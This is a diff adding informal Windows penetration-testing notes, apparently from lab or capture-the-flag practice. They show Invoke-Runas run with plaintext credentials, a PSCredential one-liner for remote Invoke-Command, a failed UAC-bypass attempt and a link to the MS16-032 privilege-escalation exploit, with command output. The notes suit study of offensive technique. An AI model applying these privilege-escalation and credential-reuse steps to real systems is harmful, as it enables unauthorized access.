@@ -168,3 +168,65 @@ get-content myfile.txt | select -first 1 -skip 9
 
 all done through sed
 
+# fuzzy security
+
+https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-Runas.ps1
+
+invokerunas giving error
+
+```
+C:\Users\m\Downloads>powershell "import-module .\invoke_runas.ps1;Invoke-runas"
+
+cmdlet Invoke-Runas at command pipeline position 1
+Supply values for the following parameters:
+User: WIN10RED
+Password: WinR3d@
+Binary: C:\Windows\System32\cmd.exe 
+LogonType: 0x1
+
+[>] Calling Advapi32::CreateProcessWithLogonW
+
+[+] Success, process details:
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     18       4     1532       2252       0.02    400   1 cmd
+
+```
+
+can we pass with commands
+
+
+-NoNewWindows start-process
+
+can we again run the binary to get a new much more exploitable version of windows powershell?
+
+This work :
+
+```
+C:\Users\m\Downloads>powershell "Start-Process C:\Windows\System32\cmd.exe -NoNewWindow"
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+```
+$pass = convertTo-SecureString 'password@123' -AsPlainText -Force;$name="m";$cred = New-Object System.Management.Automation.PSCredential($name,$pass);Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
+```
+
+UACbypass from here:
+
+```
+C:\Users\m\Downloads>powershell "import-module .\uace_bypass.ps1;Bypass-UAC -Method UacMethodSysprep"
+
+[!] The current user is not part of the Administrator group!
+```
+
+otherway is to use https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+
+we can also create a exe that runs all the commands
+
+
+
+
+
+
